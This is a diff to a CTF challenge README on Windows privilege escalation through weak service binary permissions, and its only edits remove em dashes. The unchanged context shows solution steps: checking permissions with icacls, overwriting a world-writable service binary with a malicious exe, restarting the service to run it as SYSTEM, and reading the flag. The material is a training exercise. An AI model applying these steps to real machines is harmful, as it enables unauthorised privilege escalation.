@@ -1,4 +1,4 @@
-# Challenge 3 — Weak Service Binary Permissions
+# Challenge 3  Weak Service Binary Permissions
 
 **Difficulty:** Easy  
 **Category:** Windows Privilege Escalation  
@@ -67,9 +67,9 @@ Restart-Service BackupService
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Find the vulnerable service and check permissions
+### Step 1  Find the vulnerable service and check permissions
 
 ```powershell
 icacls "C:\Services\BackupService\BackupService.exe"
@@ -80,9 +80,9 @@ Output includes:
 Everyone:(F)
 ```
 
-Full control for everyone — we can overwrite the binary.
+Full control for everyone  we can overwrite the binary.
 
-### Step 2 — Replace the binary with a payload
+### Step 2  Replace the binary with a payload
 
 On your attack machine (Kali/Mac), generate a malicious exe:
 
@@ -99,7 +99,7 @@ Copy-Item C:\Users\ctfplayer\Desktop\BackupService.exe `
   -Destination "C:\Services\BackupService\BackupService.exe" -Force
 ```
 
-### Step 3 — Restart the service
+### Step 3  Restart the service
 
 ```powershell
 Restart-Service BackupService
@@ -107,7 +107,7 @@ Restart-Service BackupService
 
 Windows stops the old binary and starts your replacement as SYSTEM.
 
-### Step 4 — Read the flag
+### Step 4  Read the flag
 
 ```powershell
 type C:\Users\Public\flag.txt
@@ -119,6 +119,6 @@ CTF{w34k_s3rv1c3_b1n_r3pl4c3d}
 
 ### Why this works
 
-Service binaries run under the account configured for that service — often SYSTEM or a high-privileged account. If the binary itself is writable by low-privileged users, an attacker can silently swap it for a malicious one. Service binary files should be owned by SYSTEM or Administrators with no write permissions for regular users.
+Service binaries run under the account configured for that service  often SYSTEM or a high-privileged account. If the binary itself is writable by low-privileged users, an attacker can silently swap it for a malicious one. Service binary files should be owned by SYSTEM or Administrators with no write permissions for regular users.
 
 </details>
